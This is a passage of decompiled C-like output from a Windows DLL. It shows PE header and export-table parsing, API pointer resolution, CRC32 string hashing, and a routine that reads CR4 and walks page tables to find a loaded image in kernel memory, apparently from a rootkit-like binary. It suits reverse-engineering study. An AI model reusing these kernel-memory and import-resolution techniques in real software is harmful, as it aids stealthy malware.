                                                                                                                                          else
                                                                                                                                          {
                                                                                                                                            result = 1758527573;
                                                                                                                                          }
                                                                                                                                        }
                                                                                                                                        else
                                                                                                                                        {
                                                                                                                                          result = 1756233813;
                                                                                                                                        }
                                                                                                                                      }
                                                                                                                                      else
                                                                                                                                      {
                                                                                                                                        result = 1756299349;
                                                                                                                                      }
                                                                                                                                    }
                                                                                                                                    else
                                                                                                                                    {
                                                                                                                                      result = 1756102741;
                                                                                                                                    }
                                                                                                                                  }
                                                                                                                                  else
                                                                                                                                  {
                                                                                                                                    result = 1756168277;
                                                                                                                                  }
                                                                                                                                }
                                                                                                                                else
                                                                                                                                {
                                                                                                                                  result = 1755971669;
                                                                                                                                }
                                                                                                                              }
                                                                                                                              else
                                                                                                                              {
                                                                                                                                result = 1756037205;
                                                                                                                              }
                                                                                                                            }
                                                                                                                            else
                                                                                                                            {
                                                                                                                              result = 1755840597;
                                                                                                                            }
                                                                                                                          }
                                                                                                                          else
                                                                                                                          {
                                                                                                                            result = 1755906133;
                                                                                                                          }
                                                                                                                        }
                                                                                                                        else
                                                                                                                        {
                                                                                                                          result = 1755709525;
                                                                                                                        }
                                                                                                                      }
                                                                                                                      else
                                                                                                                      {
                                                                                                                        result = 1755775061;
                                                                                                                      }
                                                                                                                    }
                                                                                                                    else
                                                                                                                    {
                                                                                                                      result = 1755578453;
                                                                                                                    }
                                                                                                                  }
                                                                                                                  else
                                                                                                                  {
                                                                                                                    result = 1755644954;
                                                                                                                  }
                                                                                                                }
                                                                                                                else
                                                                                                                {
                                                                                                                  result = 1755381845;
                                                                                                                }
                                                                                                              }
                                                                                                              else
                                                                                                              {
                                                                                                                result = 1757282389;
                                                                                                              }
                                                                                                            }
                                                                                                            else
                                                                                                            {
                                                                                                              result = 1757347925;
                                                                                                            }
                                                                                                          }
                                                                                                          else
                                                                                                          {
                                                                                                            result = 1757151317;
                                                                                                          }
                                                                                                        }
                                                                                                        else
                                                                                                        {
                                                                                                          result = 1757216853;
                                                                                                        }
                                                                                                      }
                                                                                                      else
                                                                                                      {
                                                                                                        result = 1757020245;
                                                                                                      }
                                                                                                    }
                                                                                                    else
                                                                                                    {
                                                                                                      result = 1757085781;
                                                                                                    }
                                                                                                  }
                                                                                                  else
                                                                                                  {
                                                                                                    result = 1756889173;
                                                                                                  }
                                                                                                }
                                                                                                else
                                                                                                {
                                                                                                  result = 1756954709;
                                                                                                }
                                                                                              }
                                                                                              else
                                                                                              {
                                                                                                result = 1756758101;
                                                                                              }
                                                                                            }
                                                                                            else
                                                                                            {
                                                                                              result = 1756823637;
                                                                                            }
                                                                                          }
                                                                                          else
                                                                                          {
                                                                                            result = 1756627029;
                                                                                          }
                                                                                        }
                                                                                        else
                                                                                        {
                                                                                          result = 1756692565;
                                                                                        }
                                                                                      }
                                                                                      else
                                                                                      {
                                                                                        result = 1756495957;
                                                                                      }
                                                                                    }
                                                                                    else
                                                                                    {
                                                                                      result = 1756561493;
                                                                                    }
                                                                                  }
                                                                                  else
                                                                                  {
                                                                                    result = 1756364885;
                                                                                  }
                                                                                }
                                                                                else
                                                                                {
                                                                                  result = 1756430421;
                                                                                }
                                                                              }
                                                                              else
                                                                              {
                                                                                result = 1754137626;
                                                                              }
                                                                            }
                                                                            else
                                                                            {
                                                                              result = 1753874517;
                                                                            }
                                                                          }
                                                                          else
                                                                          {
                                                                            result = 1753940053;
                                                                          }
                                                                        }
                                                                        else
                                                                        {
                                                                          result = 1753743445;
                                                                        }
                                                                      }
                                                                      else
                                                                      {
                                                                        result = 1753808981;
                                                                      }
                                                                    }
                                                                    else
                                                                    {
                                                                      result = 1753612373;
                                                                    }
                                                                  }
                                                                  else
                                                                  {
                                                                    result = 1753677909;
                                                                  }
                                                                }
                                                                else
                                                                {
                                                                  result = 1753481301;
                                                                }
                                                              }
                                                              else
                                                              {
                                                                result = 1753546837;
                                                              }
                                                            }
                                                            else
                                                            {
                                                              result = 1753350229;
                                                            }
                                                          }
                                                          else
                                                          {
                                                            result = 1753415765;
                                                          }
                                                        }
                                                        else
                                                        {
                                                          result = 1753219157;
                                                        }
                                                      }
                                                      else
                                                      {
                                                        result = 1753284693;
                                                      }
                                                    }
                                                    else
                                                    {
                                                      result = 1755185237;
                                                    }
                                                  }
                                                  else
                                                  {
                                                    result = 1755250773;
                                                  }
                                                }
                                                else
                                                {
                                                  result = 1755054165;
                                                }
                                              }
                                              else
                                              {
                                                result = 1755119701;
                                              }
                                            }
                                            else
                                            {
                                              result = 1754923093;
                                            }
                                          }
                                          else
                                          {
                                            result = 1754988629;
                                          }
                                        }
                                        else
                                        {
                                          result = 1754792021;
                                        }
                                      }
                                      else
                                      {
                                        result = 1754857557;
                                      }
                                    }
                                    else
                                    {
                                      result = 1754660949;
                                    }
                                  }
                                  else
                                  {
                                    result = 1754726485;
                                  }
                                }
                                else
                                {
                                  result = 1754529877;
                                }
                              }
                              else
                              {
                                result = 1754595413;
                              }
                            }
                            else
                            {
                              result = 1754398805;
                            }
                          }
                          else
                          {
                            result = 1754464341;
                          }
                        }
                        else
                        {
                          result = 1754267733;
                        }
                      }
                      else
                      {
                        result = 1754333269;
                      }
                    }
                    else
                    {
                      result = 1752039509;
                    }
                  }
                  else
                  {
                    result = 1752105045;
                  }
                }
                else
                {
                  result = 1751908437;
                }
              }
              else
              {
                result = 1751973973;
              }
            }
            else
            {
              result = 1751777365;
            }
          }
          else
          {
            result = 1751842901;
          }
        }
        else
        {
          result = 1751646293;
        }
      }
      else
      {
        result = 1751711829;
      }
    }
    else
    {
      result = 1751515221;
    }
  }
  else
  {
    result = 1751581722;
  }
  return result;
}
// 100050C8: using guessed type wchar_t aKernel32_dll[13];
// 100053A4: using guessed type wchar_t aNtdll_dll[10];
// 10005890: using guessed type wchar_t aAdvapi32_dll[13];
// 100058AC: using guessed type wchar_t aUser32_dll_0[11];
// 1000B2E8: using guessed type int dword_1000B2E8;
// 1000B2EC: using guessed type int dword_1000B2EC;
// 1000B2F0: using guessed type int dword_1000B2F0;
// 1000B2F4: using guessed type int dword_1000B2F4;
// 1000B2FC: using guessed type int (__stdcall *dword_1000B2FC)(_DWORD, _DWORD, _DWORD, _DWORD);
// 1000B300: using guessed type int (__stdcall *dword_1000B300)(_DWORD, _DWORD, _DWORD);
// 1000B304: using guessed type int (__stdcall *dword_1000B304)(_DWORD, _DWORD, _DWORD);
// 1000B308: using guessed type int (__stdcall *dword_1000B308)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000B30C: using guessed type int (__stdcall *dword_1000B30C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000B310: using guessed type int dword_1000B310;
// 1000B314: using guessed type int (__thiscall *dword_1000B314)(_DWORD, _DWORD);
// 1000B318: using guessed type int (__stdcall *dword_1000B318)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000B31C: using guessed type int (__stdcall *dword_1000B31C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000B320: using guessed type int (__stdcall *dword_1000B320)(_DWORD);
// 1000B324: using guessed type int (__stdcall *dword_1000B324)(_DWORD, _DWORD);
// 1000B328: using guessed type int dword_1000B328;
// 1000B32C: using guessed type int (*dword_1000B32C)(void);
// 1000B330: using guessed type int dword_1000B330;
// 1000B334: using guessed type int dword_1000B334;
// 1000B338: using guessed type int (__stdcall *dword_1000B338)(_DWORD, _DWORD, _DWORD);
// 1000B33C: using guessed type int (__stdcall *dword_1000B33C)(_DWORD, _DWORD, _DWORD);
// 1000B340: using guessed type int (__stdcall *dword_1000B340)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000B344: using guessed type int (__stdcall *dword_1000B344)(_DWORD, _DWORD);
// 1000B348: using guessed type int (__stdcall *dword_1000B348)(_DWORD, _DWORD);
// 1000B34C: using guessed type int (__stdcall *dword_1000B34C)(_DWORD, _DWORD);
// 1000B350: using guessed type int (__stdcall *dword_1000B350)(_DWORD, _DWORD);
// 1000B354: using guessed type int (__stdcall *dword_1000B354)(_DWORD, _DWORD);
// 1000B358: using guessed type int (__stdcall *dword_1000B358)(_DWORD);
// 1000B35C: using guessed type int (__stdcall *dword_1000B35C)(_DWORD, _DWORD, _DWORD, _DWORD);
// 1000B360: using guessed type int dword_1000B360;
// 1000B364: using guessed type int (__thiscall *dword_1000B364)(_DWORD, _DWORD);
// 1000B368: using guessed type int (__thiscall *dword_1000B368)(_DWORD, _DWORD, _DWORD);
// 1000B370: using guessed type int (__stdcall *dword_1000B370)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000B374: using guessed type int (__stdcall *dword_1000B374)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000B378: using guessed type int (__stdcall *dword_1000B378)(_DWORD);
// 1000B37C: using guessed type int (__stdcall *dword_1000B37C)(_DWORD, _DWORD, _DWORD, _DWORD);
// 1000B380: using guessed type int dword_1000B380;
// 1000B384: using guessed type int dword_1000B384;
// 1000B388: using guessed type int dword_1000B388;
// 1000B38C: using guessed type int dword_1000B38C;
// 1000B390: using guessed type int (*dword_1000B390)(void);
// 1000B394: using guessed type int (__stdcall *dword_1000B394)(_DWORD);
// 1000B398: using guessed type int dword_1000B398;
// 1000B39C: using guessed type int dword_1000B39C;
// 1000B3A0: using guessed type int (__thiscall *dword_1000B3A0)(_DWORD, _DWORD, _DWORD, _DWORD);
// 1000B3A4: using guessed type int dword_1000B3A4;
// 1000B3A8: using guessed type int (__stdcall *dword_1000B3A8)(_DWORD, _DWORD);
// 1000B3AC: using guessed type int (__stdcall *dword_1000B3AC)(_DWORD, _DWORD, _DWORD);
// 1000B3B0: using guessed type int dword_1000B3B0;
// 1000B3B4: using guessed type int (*dword_1000B3B4)(void);
// 1000B3B8: using guessed type int (__stdcall *dword_1000B3B8)(_DWORD, _DWORD);
// 1000B3BC: using guessed type int dword_1000B3BC;
// 1000B3C0: using guessed type int dword_1000B3C0;
// 1000B3C4: using guessed type int dword_1000B3C4;
// 1000B3C8: using guessed type int dword_1000B3C8;
// 1000B3CC: using guessed type int dword_1000B3CC;
// 1000B3D0: using guessed type int dword_1000B3D0;
// 1000B3D4: using guessed type int dword_1000B3D4;
// 1000B3D8: using guessed type int dword_1000B3D8;
// 1000B3DC: using guessed type int dword_1000B3DC;
// 1000B3E0: using guessed type int dword_1000B3E0;
// 1000B3E4: using guessed type int dword_1000B3E4;
// 1000B3E8: using guessed type int (__stdcall *dword_1000B3E8)(_DWORD);
// 1000B3EC: using guessed type int dword_1000B3EC;
// 1000B3F0: using guessed type int dword_1000B3F0;
// 1000B3F4: using guessed type int (__stdcall *dword_1000B3F4)(_DWORD, _DWORD);
// 1000B3F8: using guessed type int (__stdcall *dword_1000B3F8)(_DWORD, _DWORD, _DWORD);
// 1000B3FC: using guessed type int (__stdcall *dword_1000B3FC)(_DWORD, _DWORD);
// 1000B400: using guessed type int (__cdecl *dword_1000B400)(_DWORD, _DWORD);
// 1000B404: using guessed type int (__cdecl *dword_1000B404)(_DWORD, _DWORD, _DWORD, _DWORD);
// 1000B408: using guessed type int (__cdecl *dword_1000B408)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000B40C: using guessed type int (__cdecl *dword_1000B40C)(_DWORD, _DWORD);
// 1000B410: using guessed type int (__cdecl *dword_1000B410)(_DWORD, _DWORD);
// 1000B414: using guessed type int (__thiscall *dword_1000B414)(_DWORD);
// 1000B418: using guessed type int (__stdcall *dword_1000B418)(_DWORD);
// 1000B41C: using guessed type int (__stdcall *dword_1000B41C)(_DWORD, _DWORD, _DWORD);
// 1000B420: using guessed type int (__stdcall *dword_1000B420)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000B424: using guessed type int (__stdcall *dword_1000B424)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000B428: using guessed type int dword_1000B428;
// 1000B42C: using guessed type int (__stdcall *dword_1000B42C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (10004A7A) --------------------------------------------------------
int __usercall sub_10004A7A<eax>(int a1<ebx>, int *a2)
{
  int result; // eax@2

  if ( a2 )
  {
    result = *a2;
    if ( *a2 )
    {
      sub_10003929(*a2);
      sub_10003956(a1, a2, 0, 0x20u);
      result = sub_10003929((int)a2);
    }
  }
  return result;
}

//----- (10004AA4) --------------------------------------------------------
signed int __cdecl sub_10004AA4(int a1, unsigned int a2, int a3, int a4)
{
  unsigned int v4; // ecx@1
  signed int result; // eax@2
  unsigned int v6; // ebx@7
  int v7; // esi@8
  int v8; // eax@9

  v4 = 0;
  if ( a1 )
  {
    if ( a3 )
    {
      if ( a4 )
      {
        v6 = *(_DWORD *)(a1 + 8);
        if ( v6 <= 0 )
        {
LABEL_12:
          result = 1755513864;
        }
        else
        {
          v7 = *(_DWORD *)(a1 + 12) + 12;
          while ( 1 )
          {
            v8 = *(_DWORD *)v7 + *(_DWORD *)(v7 + 4);
            if ( *(_DWORD *)v7 <= a2 )
            {
              if ( a2 < v8 )
                break;
            }
            ++v4;
            v7 += 40;
            if ( v4 >= v6 )
              goto LABEL_12;
          }
          *(_DWORD *)a3 = a2 + *(_DWORD *)a1 + *(_DWORD *)(40 * v4 + *(_DWORD *)(a1 + 12) + 20) - *(_DWORD *)v7;
          *(_DWORD *)a4 = v8 - a2;
          result = 1757282304;
        }
      }
      else
      {
        result = 1756692481;
      }
    }
    else
    {
      result = 1756495873;
    }
  }
  else
  {
    result = 1756561409;
  }
  return result;
}

//----- (10004B27) --------------------------------------------------------
signed int __cdecl sub_10004B27(int a1, int a2, int a3)
{
  int v3; // ebx@1
  signed int result; // eax@2
  unsigned int v5; // esi@5

  v3 = 0;
  if ( a1 )
  {
    if ( a3 )
    {
      v5 = 0;
      if ( *(_DWORD *)(a1 + 8) <= 0u )
      {
LABEL_8:
        result = 1758725129;
      }
      else
      {
        while ( sub_100038C8(v3 + *(_DWORD *)(a1 + 12), a2, 8u) )
        {
          ++v5;
          v3 += 40;
          if ( v5 >= *(_DWORD *)(a1 + 8) )
            goto LABEL_8;
        }
        *(_DWORD *)a3 = *(_DWORD *)(40 * v5 + *(_DWORD *)(a1 + 12) + 12);
        result = 1758658560;
      }
    }
    else
    {
      result = 1756037121;
    }
  }
  else
  {
    result = 1755840513;
  }
  return result;
}

//----- (10004B90) --------------------------------------------------------
int __cdecl sub_10004B90(int a1)
{
  return *(_DWORD *)(*(_DWORD *)(a1 + 20) + 52);
}

//----- (10004B9B) --------------------------------------------------------
int __cdecl sub_10004B9B(int a1)
{
  return *(_DWORD *)(*(_DWORD *)(a1 + 20) + 8);
}

//----- (10004BA6) --------------------------------------------------------
signed int __usercall sub_10004BA6<eax>(int a1<esi>, int a2)
{
  signed int result; // eax@2
  int v3; // eax@5
  int v4; // eax@7
  int v5; // [sp+0h] [bp-4h]@1

  v5 = 0;
  if ( a1 )
  {
    if ( a2 == -1 )
    {
      result = 1780285441;
    }
    else
    {
      v3 = dword_1000B324(a2, 0);
      *(_DWORD *)(a1 + 4) = v3;
      if ( v3 == -1 )
      {
        result = 1778647042;
      }
      else
      {
        v4 = sub_10003943(v3);
        *(_DWORD *)a1 = v4;
        if ( v4 )
        {
          if ( !dword_1000B318(a2, v4, *(_DWORD *)(a1 + 4), &v5, 0) || (result = 1781792768, v5 != *(_DWORD *)(a1 + 4)) )
            result = 1781661698;
        }
        else
        {
          result = 1779236867;
        }
      }
    }
  }
  else
  {
    result = 1779957761;
  }
  return result;
}
// 1000B318: using guessed type int (__stdcall *dword_1000B318)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000B324: using guessed type int (__stdcall *dword_1000B324)(_DWORD, _DWORD);

//----- (10004C1F) --------------------------------------------------------
signed int __usercall sub_10004C1F<eax>(int a1<ecx>, int a2<esi>)
{
  signed int result; // eax@2
  int v3; // ecx@3
  unsigned int v4; // edx@5
  int v5; // eax@9
  int v6; // eax@15
  int v7; // eax@17
  unsigned int v8; // edi@17
  int v9; // eax@20
  unsigned int v10; // edi@20
  unsigned int v11; // [sp+0h] [bp-4h]@1

  v11 = a1;
  if ( a2 )
  {
    v3 = *(_DWORD *)a2;
    if ( *(_DWORD *)a2 )
    {
      v4 = *(_DWORD *)(a2 + 4);
      if ( v4 )
      {
        *(_DWORD *)(a2 + 16) = v3;
        if ( *(_WORD *)v3 == 23117 )
        {
          v5 = v3 + *(_DWORD *)(v3 + 60);
          *(_DWORD *)(a2 + 20) = v5;
          if ( *(_DWORD *)(v3 + 60) + 248 <= v4 )
          {
            if ( *(_DWORD *)v5 == 17744 )
            {
              if ( *(_WORD *)(v5 + 20) == 224 )
              {
                *(_DWORD *)(a2 + 12) = v5 + 248;
                v6 = *(_WORD *)(*(_DWORD *)(a2 + 20) + 6);
                *(_DWORD *)(a2 + 8) = v6;
                if ( *(_DWORD *)(a2 + 12) + 40 * v6 <= v3 + v4 )
                {
                  v7 = *(_DWORD *)(a2 + 20);
                  v8 = *(_DWORD *)(v7 + 124);
                  result = sub_10004AA4(a2, *(_DWORD *)(v7 + 120), a2 + 24, (int)&v11);
                  if ( !(_WORD)result )
                  {
                    if ( v11 >= v8 )
                    {
                      v9 = *(_DWORD *)(a2 + 20);
                      v10 = *(_DWORD *)(v9 + 132);
                      result = sub_10004AA4(a2, *(_DWORD *)(v9 + 128), a2 + 28, (int)&v11);
                      if ( !(_WORD)result )
                      {
                        result = 1786119175;
                        if ( v11 >= v10 )
                          result = 1786445824;
                      }
                    }
                    else
                    {
                      result = 1783432199;
                    }
                  }
                }
                else
                {
                  result = 1782580231;
                }
              }
              else
              {
                result = 1784022023;
              }
            }
            else
            {
              result = 1783759879;
            }
          }
          else
          {
            result = 1781466119;
          }
        }
        else
        {
          result = 1781072903;
        }
      }
      else
      {
        result = 1780678657;
      }
    }
    else
    {
      result = 1780482049;
    }
  }
  else
  {
    result = 1780547585;
  }
  return result;
}

//----- (10004D27) --------------------------------------------------------
signed int __cdecl sub_10004D27(int a1, int a2, int a3, int a4)
{
  int v4; // ebx@1
  signed int result; // eax@2
  int v6; // esi@9
  int v7; // edi@11
  unsigned int v8; // edi@19
  int v9; // esi@19
  int v10; // ebx@20
  unsigned int *v11; // [sp+4h] [bp-10h]@9
  char v12; // [sp+8h] [bp-Ch]@9
  int v13; // [sp+Ch] [bp-8h]@1
  unsigned int v14; // [sp+10h] [bp-4h]@1

  v4 = a1;
  v14 = 0;
  v13 = 0;
  if ( a1 )
  {
    if ( a2 )
    {
      if ( a3 )
      {
        if ( a4 )
        {
          *(_DWORD *)a4 = 0;
          v6 = *(_DWORD *)(v4 + 28);
          v11 = *(unsigned int **)(v6 + 12);
          result = sub_10004AA4(v4, (unsigned int)v11, (int)&a1, (int)&v12);
          if ( !(_WORD)result )
          {
            if ( v11 )
            {
              v7 = 0;
              while ( !v14 )
              {
                if ( !sub_100039E6(a1 + *(_DWORD *)(v7 + v6 + 12) - (_DWORD)v11, a3) )
                  v14 = *(_DWORD *)(v7 + *(_DWORD *)(v4 + 28) + 16);
                v6 = *(_DWORD *)(v4 + 28);
                v7 += 20;
                if ( !*(_DWORD *)(v7 + v6 + 12) )
                {
                  if ( !v14 )
                    goto LABEL_17;
                  break;
                }
              }
              result = sub_10004AA4(v4, v14, (int)&v11, (int)&v12);
              if ( !(_WORD)result )
              {
                v9 = (int)v11;
                v8 = *v11;
                result = sub_10004AA4(v4, *v11, (int)&a1, (int)&v12);
                if ( !(_WORD)result )
                {
                  v10 = v14 - v9;
                  do
                  {
                    if ( !*(_DWORD *)v9 )
                      break;
                    if ( !sub_10003894(a1 - v8 + *(_DWORD *)v9 + 2, a2) )
                      v13 = v10 + v9;
                    v9 += 4;
                  }
                  while ( !v13 );
                  if ( v13 )
                  {
                    *(_DWORD *)a4 = v13;
                    result = 1790115840;
                  }
                  else
                  {
                    result = 1787757580;
                  }
                }
              }
            }
            else
            {
LABEL_17:
              result = 1788478476;
            }
          }
        }
        else
        {
          result = 1785528321;
        }
      }
      else
      {
        result = 1785331713;
      }
    }
    else
    {
      result = 1785397249;
    }
  }
  else
  {
    result = 1785200641;
  }
  return result;
}

//----- (10004E6F) --------------------------------------------------------
signed int __cdecl sub_10004E6F(int a1, int a2, unsigned int a3, int a4)
{
  int v4; // ebx@1
  signed int result; // eax@2
  unsigned int v6; // esi@5
  int v7; // eax@10
  unsigned int v8; // ecx@10
  bool v9; // eax@12

  v4 = 0;
  if ( a1 )
  {
    if ( a4 )
    {
      v6 = 0;
      if ( *(_DWORD *)(a1 + 8) <= 0u )
      {
LABEL_8:
        result = 1789395977;
      }
      else
      {
        while ( sub_100038C8(v4 + *(_DWORD *)(a1 + 12), a2, 8u) )
        {
          ++v6;
          v4 += 40;
          if ( v6 >= *(_DWORD *)(a1 + 8) )
            goto LABEL_8;
        }
        v7 = 40 * v6 + *(_DWORD *)(a1 + 12);
        v8 = *(_DWORD *)(v7 + 12);
        v9 = a3 >= v8 && a3 < v8 + *(_DWORD *)(v7 + 8);
        *(_DWORD *)a4 = v9;
        result = 1789329408;
      }
    }
    else
    {
      result = 1790771201;
    }
  }
  else
  {
    result = 1790574593;
  }
  return result;
}

//----- (10004EEF) --------------------------------------------------------
int __cdecl sub_10004EEF(int a1)
{
  return *(_DWORD *)(*(_DWORD *)(a1 + 20) + 80);
}

//----- (10004EFA) --------------------------------------------------------
signed int __cdecl sub_10004EFA(int a1, int a2)
{
  int v3; // eax@5
  int v4; // esi@5
  int v5; // eax@7
  signed int v6; // ebx@8
  int v7; // [sp-Ch] [bp-14h]@9
  int v8; // [sp+4h] [bp-4h]@7

  if ( !a2 )
    return 1750925313;
  if ( !a1 )
    return 1750859777;
  *(_DWORD *)a2 = 0;
  v3 = sub_10003943(32);
  v4 = v3;
  if ( !v3 )
    return 1749286915;
  *(_DWORD *)v3 = 0;
  *(_DWORD *)(v3 + 4) = 0;
  *(_DWORD *)(v3 + 8) = 0;
  *(_DWORD *)(v3 + 12) = 0;
  *(_DWORD *)(v3 + 16) = 0;
  *(_DWORD *)(v3 + 20) = 0;
  *(_DWORD *)(v3 + 24) = 0;
  *(_DWORD *)(v3 + 28) = 0;
  v5 = dword_1000B308(a1, -2147483648, 1, 0, 3, 128, 0);
  v8 = v5;
  if ( v5 == -1 )
  {
    v6 = 1752761350;
  }
  else
  {
    v6 = sub_10004BA6(v4, v5);
    if ( !(_WORD)v6 )
    {
      v6 = sub_10004C1F(v7, v4);
      if ( !(_WORD)v6 )
      {
        if ( dword_1000B320(v8) )
        {
          *(_DWORD *)a2 = v4;
          return 1751711744;
        }
        v6 = 1751252994;
      }
    }
  }
  if ( !*(_DWORD *)v4 )
    sub_10003929(0);
  if ( v8 != -1 )
    dword_1000B320(v8);
  sub_10003929(v4);
  return v6;
}
// 1000B308: using guessed type int (__stdcall *dword_1000B308)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000B320: using guessed type int (__stdcall *dword_1000B320)(_DWORD);

//----- (10006A08) --------------------------------------------------------
int __cdecl sub_10006A08(int a1, int a2)
{
  char i; // al@1
  int v3; // esi@1
  int v4; // eax@13
  int v5; // eax@16
  int v6; // eax@17

  v3 = a1 & 0xFFFFF000;
  for ( i = sub_10006AC6(a1 & 0xFFFFF000); ; i = sub_10006AC6(v3) )
  {
    if ( i )
      goto LABEL_10;
    if ( (unsigned int)v3 < 0x80000000 )
      break;
    if ( (unsigned int)(a1 - v3) > 0x5DC000 )
    {
LABEL_10:
      while ( (unsigned int)v3 >= 0x80000000 && (unsigned int)(a1 - v3) <= 0x5DC000 )
      {
        if ( *(_WORD *)v3 == 23117 )
        {
          v4 = v3 + *(_DWORD *)(v3 + 60);
          if ( *(_DWORD *)v4 == 17744 )
          {
            if ( *(_WORD *)(v4 + 24) == 267 )
            {
              if ( !a2
                || (v5 = v3 + *(_DWORD *)(v4 + 120), v5 != v3)
                && (v6 = *(_DWORD *)(v5 + 12)) != 0
                && !sub_1000859C(v3 + v6, a2) )
                return v3;
            }
          }
          return 0;
        }
        do
        {
          v3 -= 4096;
          if ( sub_10006AC6(v3) )
            break;
          if ( (unsigned int)v3 < 0x80000000 )
            return 0;
        }
        while ( (unsigned int)(a1 - v3) <= 0x5DC000 );
      }
      return 0;
    }
    v3 -= 4096;
  }
  return 0;
}

//----- (10006AC6) --------------------------------------------------------
char __cdecl sub_10006AC6(unsigned int a1)
{
  char v1; // dl@1
  int v3; // eax@2
  int v4; // eax@4
  int v6; // ecx@8
  unsigned int v7; // ecx@8
  unsigned int v8; // ecx@9
  int v9; // eax@10

  __asm { mov     edx, cr4 }
  v1 = (_EDX >> 5) & 1;
  if ( v1 )
    v3 = ((a1 >> 18) & 0x3FF8) - 1067450368;
  else
    v3 = ((a1 >> 20) & 0xFFC) - 1070596096;
  v4 = *(_DWORD *)v3;
  if ( !(v4 & 1) )
    return 0;
  if ( (_BYTE)v4 >= 0 )
  {
    if ( v1 )
    {
      v7 = a1 >> 9;
      v6 = v7 & 0x7FFFF8;
    }
    else
    {
      v8 = a1 >> 10;
      v6 = v8 & 0x3FFFFC;
    }
    v9 = *(_DWORD *)(v6 - 1073741824);
    if ( !v9 || (_BYTE)v9 < 0 )
      return 0;
    if ( !(v9 & 1) )
    {
      if ( v9 & 0x400 )
      {
        if ( (v9 & 0xFFFFF000) == -4096 )
          return 0;
      }
      else
      {
        if ( !(v9 & 0xBE0) || v9 & 0x200 )
          return 0;
      }
    }
  }
  return 1;
}

//----- (10006C34) --------------------------------------------------------
char __cdecl sub_10006C34(int a1, int a2)
{
  char result; // al@3

  if ( a1 && a2 )
    result = 0;
  else
    result = 0;
  return result;
}

//----- (10006FAC) --------------------------------------------------------
__int16 *__usercall sub_10006FAC<eax>(int a1<ebx>)
{
  char v2; // [sp+18h] [bp-54h]@1
  char v3; // [sp+40h] [bp-2Ch]@1
  char v4; // [sp+58h] [bp-14h]@1
  __int16 v5; // [sp+60h] [bp-Ch]@1
  int v6; // [sp+62h] [bp-Ah]@1
  __int16 v7; // [sp+66h] [bp-6h]@1
  int v8; // [sp+68h] [bp-4h]@1

  v5 = 0;
  v6 = 0;
  v7 = 0;
  v8 = 0;
  sub_10008469(a1, &v3, 0, 0x18u);
  sub_10008469(a1, &v4, 0, 8u);
  sub_10008469(a1, &v2, 0, 0x28u);
  return &v5;
}

//----- (100072AD) --------------------------------------------------------
int __cdecl sub_100072AD(int a1, int a2, char a3, int a4)
{
  int v5; // eax@1

  *(_DWORD *)(a1 + 148) = 32;
  *(_DWORD *)(a1 + 152) = 32;
  *(_DWORD *)(a1 + 200) = 32;
  *(_DWORD *)(a1 + 184) = a2;
  v5 = a4;
  *(_DWORD *)(a1 + 160) = 4;
  *(_DWORD *)(a1 + 176) = 0;
  *(_DWORD *)(a1 + 164) = 1;
  *(_DWORD *)(a1 + 172) = 2;
  *(_DWORD *)(a1 + 168) = 3;
  *(_DWORD *)(a1 + 156) = 5;
  *(_DWORD *)(a1 + 180) = 0;
  *(_DWORD *)(a1 + 140) = 0;
  *(_DWORD *)(a1 + 144) = 56;
  *(_DWORD *)(a1 + 188) = 24;
  *(_DWORD *)(a1 + 192) = 512;
  *(_DWORD *)a1 = 65543;
  *(_DWORD *)(a1 + 196) = v5 - 4;
  return v5 - 4;
}

//----- (10007386) --------------------------------------------------------
int *__cdecl sub_10007386()
{
  int v1; // [sp+40h] [bp-4h]@1

  return &v1;
}

//----- (10007C56) --------------------------------------------------------
#error "10007C61: positive sp value has been found (funcsize=3)"

//----- (10008286) --------------------------------------------------------
#error "100083E3: positive sp value has been found (funcsize=127)"

//----- (100083EA) --------------------------------------------------------
signed int __stdcall sub_100083EA(int a1)
{
  int v1; // eax@1
  int v2; // esi@1
  signed int v3; // edx@2
  int v4; // ecx@2

  v2 = a1;
  v1 = -1;
  while ( *(_BYTE *)v2 )
  {
    v4 = *(_BYTE *)v2 ^ (unsigned __int8)v1;
    v3 = 8;
    do
    {
      if ( v4 & 1 )
        v4 = ((unsigned int)v4 >> 1) ^ 0xEDB88320;
      else
        v4 = (unsigned int)v4 >> 1;
      --v3;
    }
    while ( v3 );
    v1 = v4 ^ ((unsigned int)v1 >> 8);
    ++v2;
  }
  return ~v1;
}

//----- (10008469) --------------------------------------------------------
void *__usercall sub_10008469<eax>(int a1<ebx>, void *a2, char a3, unsigned int a4)
{
  int i; // ecx@2
  int v5; // edi@2
  int v6; // eax@2

  if ( a4 )
  {
    LOBYTE(a1) = a3;
    BYTE1(a1) = a3;
    v6 = a1 << 16;
    LOWORD(v6) = a1;
    memset(a2, v6, 4 * (a4 >> 2));
    v5 = (int)((char *)a2 + 4 * (a4 >> 2));
    for ( i = a4 & 3; i; --i )
      *(_BYTE *)v5++ = a3;
  }
  return a2;
}

//----- (100084C2) --------------------------------------------------------
unsigned int __cdecl sub_100084C2(const char *a1)
{
  return strlen(a1);
}

//----- (100084E9) --------------------------------------------------------
int __cdecl sub_100084E9(int a1, int a2)
{
  int v2; // edx@1
  int v3; // esi@1
  int v4; // eax@2
  int v5; // eax@5
  unsigned __int16 v6; // cx@5

  v2 = a1;
  v3 = a2;
  do
  {
    v4 = *(_WORD *)v2;
    if ( (_WORD)v4 >= 0x41u )
    {
      if ( (_WORD)v4 <= 0x5Au )
        v4 += 32;
    }
    v6 = v4;
    v5 = *(_WORD *)v3;
    if ( (_WORD)v5 >= 0x41u )
    {
      if ( (_WORD)v5 <= 0x5Au )
        v5 += 32;
    }
    v2 += 2;
    v3 += 2;
  }
  while ( v6 && v6 == (_WORD)v5 );
  return v6 - (unsigned __int16)v5;
}

//----- (1000859C) --------------------------------------------------------
